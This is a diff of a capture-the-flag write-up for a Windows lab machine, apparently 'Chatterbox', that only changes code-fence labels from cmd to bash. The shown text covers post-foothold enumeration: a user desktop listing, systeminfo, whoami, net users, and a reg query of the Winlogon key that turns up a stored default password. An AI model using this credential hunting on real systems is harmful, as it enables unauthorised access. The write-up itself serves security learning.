@@ -168,7 +168,7 @@ C:\Windows\system32>
 C:\Windows\system32>
 ```
 Bam!!! Foothold! We could probably get the user flag here:
-```cmd
+```bash
 c:\Windows\System32>dir c:\users\alfred\desktop
 dir c:\users\alfred\desktop
  Volume in drive C has no label.
@@ -185,8 +185,8 @@ dir c:\users\alfred\desktop
 
 ## PrivEsc
 So now we are in the box, but who are we? Let's get some info:
-```cmd
-systeminfo                                                                                                                                                               
+```bash
+c:\Windows\system32>systeminfo                                                                                                                                                               
 systeminfo                                                                                                                                                                                   
                                                                                                                                                                                              
 Host Name:                 CHATTERBOX                                                                                                                                                        
@@ -199,7 +199,7 @@ Registered Owner:          Windows User
 [...SNIP...]
 ```
 Interesting info, but nothing really blowing my hair back... Let's see who we are and what we can do:
-```cmd
+```bash
 C:\Windows\system32>whoami
 whoami
 chatterbox\alfred
@@ -220,7 +220,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 ```
 
 Let's see how many users are on this box
-```cmd
+```bash
 C:\Windows\Panther>net users
 net users
 
@@ -234,7 +234,7 @@ The command completed successfully.
 OK, so it's just us and the admin.. let's hunt for some credentials...
 
 aaaaaand we find a default password in the registry!
-```cmd
+```bash
 C:\Windows\Panther>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
